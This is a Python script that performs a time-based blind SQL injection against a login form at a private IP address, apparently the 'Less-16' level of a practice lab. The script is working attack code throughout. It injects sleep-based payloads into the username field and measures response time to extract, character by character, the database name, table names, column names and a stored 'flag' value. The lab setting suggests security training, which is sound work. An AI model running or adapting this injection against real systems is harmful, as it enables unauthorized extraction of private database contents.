import requests
import time
import datetime

url = "http://192.168.120.139:30003/Less-16/"

def get_dbname():
    db_name = ''
    for i in range(1,9):
        for k in range(32,127):
            database_payload = {"uname":'admin")'+" and if(ascii(substr(database(),%d,1))=%d,sleep(2),1)#"%(i,k),"passwd":"1"}
            time1 = datetime.datetime.now()
            res = requests.post(url,database_payload)
            time2 = datetime.datetime.now()
            difference = (time2-time1).seconds
            if difference > 1:
                db_name += chr(k)
                print("数据库名为->"+db_name)
get_dbname()

def get_table():
    table1 = ''
    table2 = ''
    table3 = ''
    table4 = ''
    for i in range(5):
        for j in range(6):
            for k in range(32,127):
                table_payload = {"uname":'admin")'+" and if(ascii(substr((select table_name from information_schema.tables where table_schema=\'security\' limit %d,1),%d,1))=%d,sleep(2),1)#"%(i,j,k),"passwd":"1"}
                time1 = datetime.datetime.now()
                res = requests.post(url,table_payload)
                time2 = datetime.datetime.now()
                difference = (time2-time1).seconds
                if difference > 1:
                    if i == 0:
                        table1 += chr(k)
                        print("第一张表名为->"+table1)
                    if i == 1:
                        table2 += chr(k)
                        print("第二张表名为->"+table2)
                    if i == 2:
                        table3 += chr(k)
                        print("第三张表名为->"+table3)
                    if i == 3:
                        table4 += chr(k)
                        print("第四张表名为->"+table4)
                    else:
                        continue
get_table()

def get_column():
    column1 = ''
    column2 = ''
    column3 = ''
    column4 = ''
    for i in range(5):
        for j in range(6):
            for k in range(32,127):
                column_payload = {"uname":'admin")'+" and if(ascii(substr((select column_name from information_schema.columns where table_name=\'flag\' limit %d,1),%d,1))=%d,sleep(2),1)#"%(i,j,k),"passwd":"1"}
                time1 = datetime.datetime.now()
                res = requests.post(url,column_payload)
                time2 = datetime.datetime.now()
                difference = (time2-time1).seconds
                if difference > 1:
                    if i == 0:
                        column1 += chr(k)
                        print("第一个字段名为->"+column1)
                    if i == 1:
                        column2 += chr(k)
                        print("第二个字段名为->"+column2)
                    if i == 2:
                        column3 += chr(k)
                        print("第三个字段名为->"+column3)
                    if i == 3:
                        column4 += chr(k)
                        print("第四个字段名为->"+column4)
                    else:
                        continue
get_column()

def get_flag():
    flag = ''
    for i in range(30):
        for k in range(32,127):
            flag_payload = {"uname":'admin")'+" and if(ascii(substr((select flag from flag),%d,1))=%d,sleep(2),1)#"%(i,k),"passwd":"1"}
            time1 = datetime.datetime.now()
            res = requests.post(url,flag_payload)
            time2 = datetime.datetime.now()
            difference = (time2-time1).seconds
            if difference > 1:
                flag += chr(k)
                print("flag为->"+flag)
            else:
                continue
get_flag()